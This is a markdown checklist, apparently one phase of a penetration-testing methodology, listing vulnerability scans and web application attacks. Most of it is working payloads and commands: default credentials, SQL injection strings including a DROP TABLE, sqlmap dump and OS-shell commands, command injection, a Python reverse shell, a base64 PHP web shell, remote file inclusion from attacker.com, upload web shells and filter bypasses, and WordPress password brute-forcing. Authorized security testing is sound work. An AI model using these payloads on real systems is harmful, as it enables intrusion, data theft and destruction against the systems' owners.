## ðŸŽ­ Phase 2: Advanced Vulnerability Assessment

### Automated Vulnerability Scanning

#### Nmap Vulnerability Scripts
- [ ] **Targeted Vulnerability Scans**:
  ```bash
  nmap --script vuln -p <specific_ports> <target>
  nmap --script "*vuln*" --script-args=unsafe=1 <target>
  ```
- [ ] **SMB Vulnerabilities**:
  ```bash
  nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061 <target>
  ```

#### Multi-Scanner Approach
- [ ] **Nessus** (if available): Comprehensive vulnerability assessment
- [ ] **OpenVAS** (if available): Open-source vulnerability scanner
- [ ] **Nuclei**:
  ```bash
  nuclei -u http://<target> -t /path/to/nuclei-templates/
  ```

### Web Application Testing (Comprehensive)

#### Authentication Testing
- [ ] **Default Credentials Testing**:
  - admin:admin, admin:password, root:root, admin:, root:toor
  - Service-specific defaults (tomcat:tomcat, admin:admin123)
- [ ] **Password Policy Analysis**: Check for weak password requirements
- [ ] **Account Lockout Testing**: Verify if accounts lock after failed attempts
- [ ] **Session Management**: Check for session fixation, weak session IDs

#### Input Validation Testing

##### SQL Injection (Multiple Techniques)
- [ ] **Manual Testing**:
  ```sql
  ' OR '1'='1
  ' OR '1'='1'--
  ' OR '1'='1'/*
  '; DROP TABLE users--
  ' UNION SELECT 1,2,3--
  ```
- [ ] **SQLMap Automation**:
  ```bash
  sqlmap -u "http://<target>/page.php?id=1" --batch --dbs
  sqlmap -u "http://<target>/page.php?id=1" --batch --tables -D <database>
  sqlmap -u "http://<target>/page.php?id=1" --batch --dump -T <table>
  sqlmap -u "http://<target>/page.php?id=1" --os-shell
  ```
- [ ] **Blind SQL Injection**:
  ```sql
  ' AND (SELECT COUNT(*) FROM users) > 0--
  ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
  ```

##### Command Injection
- [ ] **Basic Payloads**:
  ```bash
  ; ls
  && whoami
  | id
  `whoami`
  $(whoami)
  ```
- [ ] **Advanced Payloads**:
  ```bash
  ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

##### Cross-Site Scripting (XSS)
- [ ] **Reflected XSS**:
  ```html
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  ```
- [ ] **Stored XSS**: Test in all input fields that display user content
- [ ] **DOM XSS**: Analyze JavaScript for client-side vulnerabilities

##### Directory Traversal & LFI/RFI
- [ ] **Path Traversal**:
  ```
  ../../etc/passwd
  ../../windows/system32/drivers/etc/hosts
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  ```
- [ ] **Local File Inclusion**:
  ```
  php://filter/read=convert.base64-encode/resource=index.php
  expect://whoami
  data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b
  ```
- [ ] **Remote File Inclusion**:
  ```
  http://attacker.com/shell.txt
  ftp://attacker.com/shell.php
  ```

#### File Upload Vulnerabilities
- [ ] **Unrestricted File Upload**:
  ```php
  <?php system($_GET['cmd']); ?>
  <?php echo shell_exec($_GET['cmd']); ?>
  ```
- [ ] **Bypass Techniques**:
  - Double extension: shell.php.jpg
  - Null byte: shell.php%00.jpg
  - Content-Type manipulation
  - Magic bytes prepending
  - Case variation: .PHP, .pHp

#### Business Logic Testing
- [ ] **IDOR (Insecure Direct Object References)**:
  - Change user IDs in URLs/parameters
  - Test sequential access to resources
- [ ] **Price Manipulation**: In e-commerce applications
- [ ] **Race Conditions**: Concurrent request testing
- [ ] **Workflow Bypasses**: Skip steps in multi-step processes

### CMS-Specific Testing

#### WordPress
- [ ] **WPScan**:
  ```bash
  wpscan --url http://<target> --enumerate u,p,t --api-token <token>
  wpscan --url http://<target> --passwords passwords.txt --usernames admin
  ```
- [ ] **Manual WordPress Testing**:
  - Check /wp-admin/, /wp-content/, /wp-includes/
  - XML-RPC testing: /xmlrpc.php
  - User enumeration: /?author=1

#### Joomla
- [ ] **JoomScan**:
  ```bash
  joomscan -u http://<target>
  ```
- [ ] **Manual Joomla Testing**:
  - /administrator/ access
  - Component/module enumeration

#### Drupal
- [ ] **Droopescan**:
  ```bash
  droopescan scan drupal -u http://<target>
  ```

---